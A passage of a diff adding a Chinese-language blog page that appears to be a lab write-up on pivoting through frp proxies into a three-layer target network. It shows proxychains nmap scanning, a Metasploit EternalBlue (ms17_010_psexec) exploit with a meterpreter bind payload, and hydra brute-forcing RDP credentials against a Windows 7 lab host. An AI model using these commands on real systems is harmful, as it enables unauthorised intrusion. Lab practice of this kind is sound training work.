+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938909.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938909.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938909.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202303081938909.png"
+        title="image-20230308193810873" /></p>
+<p><code>proxychains</code>的ip和端口依然是 192.168.1.133 1080</p>
+<p>用proxychains跑一下33网段的nmap</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>proxychains nmap -Pn -sT 192.168.33.33
+</span></span></code></pre></div><p>顺利跑出</p>
+<!-- raw HTML omitted -->
+<p>445 直接打永恒之蓝 还有3389远程桌面连接</p>
+<h2 id="靶机3-win7">靶机3 win7</h2>
+<p>用proxychains 打开msf</p>
+<pre tabindex="0"><code>proxychains msfconsole
+</code></pre><p>打永恒之蓝正向连接的payload</p>
+<pre tabindex="0"><code>use exploit/windows/smb/ms17_010_psexec
+set payload windows/meterpreter/bind_tcp
+set RHOST 192.168.33.33
+options
+run
+</code></pre><p>可以顺利shell</p>
+<p>但是发现 frp的二层代理会很不稳定</p>
+<p>直接爆破用户密码也可</p>
+<pre tabindex="0"><code>proxychains hydra  192.168.33.33 rdp -l Administrator -P pass.txt -V
+</code></pre><p>redesktop 远程连接</p>
+<pre tabindex="0"><code>proxychains rdesktop 192.168.33.33
+</code></pre><!-- raw HTML omitted -->
+<p>主要是练习frp代理搭建，所以就没很细</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" data-title="三层靶机frp" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" data-title="三层靶机frp"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" data-title="三层靶机frp"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/" data-title="三层靶机frp"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" class="prev" rel="prev" title="红日靶场 1"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>红日靶场 1</a>
+            <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" class="next" rel="next" title="CFS三层靶机">CFS三层靶机<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
